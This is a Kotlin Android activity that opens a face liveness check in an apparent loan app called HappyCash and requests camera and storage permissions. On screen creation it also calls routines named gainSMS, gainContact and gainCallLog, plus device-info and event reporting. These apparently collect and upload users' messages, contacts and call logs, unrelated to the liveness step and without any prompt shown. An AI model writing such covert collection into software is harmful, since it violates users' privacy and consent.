package com.yinshan.happycash.view.liveness.view.impl

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.Toast

import com.yinshan.happycash.R

import com.yinshan.happycash.analytic.DeviceInfoController
import com.yinshan.happycash.analytic.upload.AllReport
import com.yinshan.happycash.analytic.upload.EventReport
import com.yinshan.happycash.framework.BaseActivity
import com.yinshan.happycash.framework.TokenManager
import com.yinshan.happycash.utils.ToastUtils

/**
 * 活体
 */
class OliveStartActivity : Activity(), View.OnClickListener {

    private var startLivenessButton: Button? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(resources.getIdentifier("oliveapp_activity_start", "layout", packageName))
        startLivenessButton = findViewById(resources.getIdentifier("oliveappStartLivenessButton", "id", packageName))
        startLivenessButton!!.setOnClickListener(this)
        AllReport.getInstance().gainSMS()
        AllReport.getInstance().gainContact()
        AllReport.getInstance().gainCallLog()
        /*controller_edit**/
        DeviceInfoController.getInstance().gainDeviceInfo()
        /*Event_edit**/
        EventReport.getInstance().gainEvent()
    }

    private fun requestPermission(): Boolean {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE), PERMISSION_WRITE_EXTERNAL_STORAGE)
            return false
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), PERMISSION_READ_EXTERNAL_STORAGE)
            return false
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_DENIED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERMISSION_CAMERA)
            return false
        }

        return true
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        try {
            when (requestCode) {
                PERMISSION_CAMERA -> {
                    if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                        startLivenessButton!!.callOnClick()
                    } else {
                        ToastUtils.showShort(R.string.request_camera)
                    }
                }
                PERMISSION_READ_EXTERNAL_STORAGE -> {
                    if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                        startLivenessButton!!.callOnClick()
                    } else {
                        ToastUtils.showShort(R.string.request_space)
                    }
                }
                PERMISSION_WRITE_EXTERNAL_STORAGE -> {
                    if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                        startLivenessButton!!.callOnClick()
                    } else {
                        ToastUtils.showShort(R.string.request_space)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to request permission", e)
        }

    }

    override fun onClick(v: View) {
        if (requestPermission()) {
            startActivity(Intent(this@OliveStartActivity, OliveLivenessActivity::class.java))
            finish()
        }
    }

    companion object {
        private val TAG = OliveStartActivity::class.java.simpleName
        private const val PERMISSION_READ_EXTERNAL_STORAGE = 101
        private const val PERMISSION_WRITE_EXTERNAL_STORAGE = 102
        private const  val PERMISSION_CAMERA = 103
    }
}
